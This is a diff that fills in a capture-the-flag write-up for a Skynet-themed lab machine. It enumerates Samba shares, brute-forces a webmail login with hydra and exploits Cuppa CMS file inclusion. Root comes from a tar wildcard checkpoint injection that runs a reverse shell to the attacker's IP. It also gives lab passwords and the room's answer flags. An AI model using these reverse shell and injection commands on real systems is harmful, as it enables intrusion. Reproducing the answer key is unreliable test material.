@@ -51,20 +51,140 @@ Host script results:
 
 ```markdown
 We begin with the Nmap scan with the -Pn flag.
+
+On checking the website at <http://10.10.123.65>, we are greeted with Skynet Search.
+
+The search does not work and the source code for the website does not yield any results.
+
+Meanwhile, we can attempt to enumerate Samba shares using enum4linux tool.
+
+This gives us info about user 'milesdyson', and includes 4 shares - print$, anonymous, milesdyson and IPC$.
+
+We can access the 'anonymous' share without password.
+
+From the files available on the share, we find a wordlist.
+
+Simultaneously, we can scan the website directory.
+
+We get results such as /admin, /css, /js, /config and /squirrelmail
+
+We can access only the /squirrelmail directory, which leads us to a login page.
+
+We can brute-force our way in using the username 'milesdyson' and passwords from the wordlist we got earlier.
+
+Using the creds milesdyson:cyborg007haloterminator, we login to the mail page, where we find the new samba share password: )s{A&2Z=F^n_E.B` for Miles.
+
+milesdyson's share includes a txt file which includes the directory /45kra24zxs28v3yd.
+
+<http://10.10.123.65/45kra24zxs28v3yd> leads to Miles Dyson's personal page.
+
+We can scan this website for hidden directories as well.
+
+On using Gobuster to scan the website, we get the /administrator directory, leading to a Cuppa CMS page.
+
+After some recon, we find out that Cuppa CMS has an exploit related to it, based on RFI (Remote File Inclusion).
+
+Following the exploit, we setup a listener and host a Python server to upload the reverse-shell PHP file.
+
+After this, we can visit the following URL: <http://10.10.123.65/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.17.48.136:8000/reverse-shell.php>, where the part after urlConfig needs to contain our IP.
+
+On getting shell access, we start enumeration.
+
+We can see that this machine has some cronjobs, and it includes a script.
+
+Now the script calls a shell, navigates to a directory and takes backup using tar and wildcards.
+
+This can be exploited, and we can refer multiple blogs which cover tar wildcard and checkpoint exploitation.
+
+For the root shell, we setup a listener and the payload is inserted into a script, which is also included in the backup directory.
+
+After executing the required command, we get root access.
 ```
 
 ```shell
 nmap -Pn -T4 --top-ports 10000 -A 10.10.123.65
+
+gobuster dir -u http://10.10.123.65 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+
+enum4linux -U -S 10.10.123.65
+
+smbclient //10.10.123.65/anonymous
+
+#gives access to smb share
+help
+
+ls
+
+get attention.txt
+
+cd logs
+
+ls
+
+mget log*
+
+exit
+
+hydra -l milesdyson -P terminatorlist.txt 10.10.123.65 http-post-form "/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^:incorrect"
+
+#after getting password from squirrelmail
+smbclient //10.10.123.65/milesdyson -U milesdyson
+#-U for username
+#gives access to milesdyson's share
+ls
+
+cd notes
+
+get important.txt
+
+exit
+
+cat important.txt
+#this includes the beta directory
+
+gobuster dir -u http://10.10.123.65/45kra24zxs28v3yd/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+
+#for exploit
+nc -nvlp 1234
+
+python3 -m http.server
+#for uploading reverse-shell.php
+#once we visit the required URL, we get shell access
+
+#in remote shell
+pwd
+
+cat /home/milesdyson/user.txt
+#user flag
+#we can proceed with attempting to escalate our privileges
+
+cat /etc/crontab
+#shows backup script and its path
+
+cat backups/backup.sh
+#shows script content
+
+printf '#!/bin/bash\nbash -i >& /dev/tcp/10.17.48.136/4445 0>&1' > /var/www/html/shell
+#creates shell script
+
+chmod +x /var/www/html/shell
+
+touch /var/www/html/--checkpoint=1
+
+touch /var/www/html/--checkpoint-action=exec=bash\ shell
+
+#after a minute, we get root access on our listener
+cat /root/root.txt
 ```
 
 ```markdown
-1. What is Miles password for his emails?
+1. What is Miles password for his emails? - cyborg007haloterminator
 
-2. What is the hidden directory?
+2. What is the hidden directory? - /45kra24zxs28v3yd
 
-3. What is the vulnerability called when you can include a remote file for malicious purposes?
+3. What is the vulnerability called when you can include a remote file for malicious purposes? - Remote File Inclusion
 
-4. What is the user flag?
+4. What is the user flag? - 7ce5c2109a40f958099283600a9ae807
 
-5. What is the root flag?
+5. What is the root flag? - 3f0372db24753accc7179a282cd6a949
 ```
